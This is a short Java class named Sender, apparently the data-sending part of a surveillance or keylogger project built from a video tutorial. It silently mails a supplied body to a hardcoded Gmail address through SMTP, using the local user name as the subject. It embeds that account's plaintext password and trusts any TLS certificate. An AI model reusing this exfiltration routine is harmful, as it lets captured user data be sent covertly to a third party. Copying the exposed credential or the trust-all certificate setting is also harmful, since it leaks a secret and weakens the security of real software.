/*
    Code borrowed and modified from
    https://www.youtube.com/watch?v=0ASRTmyBJQc&list=PLqPiVbhEJlA5UPea5pxPO851iXyoOJkLN&index=3
 */
package main;

import java.util.Properties;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class Sender {
    private Sender() {}

    private static final String EMAIL = "temp68068@gmail.com";
    public static final String PASSWORD = "6oeT~9P(:LFNHCNJ-w\\@Sdr~";

    public static Properties emailServerProperties;
    public static Session emailSession;
    public static MimeMessage emailMessage;

    public static void sendEmail(String emailBody) throws Throwable{
        // make sure our properties are not null
        // smtp = simple mail protocol transfer
        // 587 = make sure port is open for mail
        emailServerProperties = System.getProperties();
        emailServerProperties.put("mail.smtp.port", "587");
        emailServerProperties.put("mail.smtp.auth", "true");
        emailServerProperties.put("mail.smtp.starttls.enable", "true");
        emailServerProperties.put("mail.smtp.ssl.trust", "*");
        emailServerProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");
        emailSession = Session.getDefaultInstance(emailServerProperties);

        // create mail message
        emailMessage =  new MimeMessage(emailSession);
        emailMessage.addRecipient(Message.RecipientType.BCC, new InternetAddress(EMAIL));
        emailMessage.setSubject(System.getProperty("user.name"));
        emailMessage.setContent(emailBody, "text/html");

        // ensure smtp works properly and send the email
        Transport transport = emailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com", EMAIL, PASSWORD);
        transport.sendMessage(emailMessage, emailMessage.getAllRecipients());
        transport.close();
    }
}
